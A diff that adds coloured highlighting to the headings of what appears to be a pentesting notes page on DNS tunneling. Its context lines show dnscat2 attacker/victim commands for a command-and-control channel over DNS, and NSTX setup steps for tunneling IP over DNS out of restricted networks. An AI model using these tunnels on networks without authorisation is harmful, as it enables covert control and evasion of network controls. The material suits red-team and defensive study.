@@ -1,6 +1,6 @@
 # ⭕ DNS Tunneling
 
-## DNSCat2
+## <mark style="color:red;">DNSCat2</mark>
 
 Establishes a C\&C channel through DNS. It doesn't need root privileges.
 
@@ -9,7 +9,7 @@ attacker> ruby ./dnscat2.rb tunneldomain.com
 victim> ./dnscat2 tunneldomain.com
 ```
 
-## NSTX
+## <mark style="color:red;">NSTX</mark>
 
 is a hack to tunnel IP traffic over DNS.If DNS traffic does not work, but ICMP traffic (i.e., ping) works, try ICMPTX: IP-over-ICMP. Note that these instructions play nicely with ICMPTX. You can run both on one proxy.
 
@@ -17,7 +17,7 @@ You need several things to get going:
 
 a DNS server that you can configure, (we'll call this ns.example.com) another server, one not running DNS. We're going to assume the IP address of this machine is 1.2.3.4. The reason you cannot run DNS on the same machine, is that you're going to run nstx on this machine. Nstx must run on port 53, like DNS. a crippled Internet connection, i.e., one that only allows you to issue DNS queries.
 
-### Configure a new DNS subdomain
+### <mark style="color:orange;">Configure a new DNS subdomain</mark>
 
 Let's assume you're running the domain "example.com". The nameserver for this domain is, as mentioned before, "ns.example.com". Configure "ns.example.com" by adding a subdomain, "tunnel.example.com". You do this by appending the following DNS records at the end of the zone file for "example.com":
 
@@ -32,7 +32,7 @@ ns              IN      A       1.2.3.4
 
 In other words. We configured 1.2.3.4 to be the name server for a new subdomain "tunnel.example.com".
 
-### Install and configure the bogus DNS server
+### <mark style="color:orange;">Install and configure the bogus DNS server</mark>
 
 On the machine 1.2.3.4, make sure your kernel supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:
 
@@ -105,7 +105,7 @@ You can make sure this is permanent by editing /etc/sysctl.conf:
 net/ipv4/ip_forward=1
 ```
 
-### Configure the client
+### <mark style="color:orange;">Configure the client</mark>
 
 Make sure the kernel on the client machine also supports the TUN/TAP network device. If you installed a standard 2.6 kernel image, it does. You may have to manually /sbin/modprobe tun. Install the nstx Debian package:
 
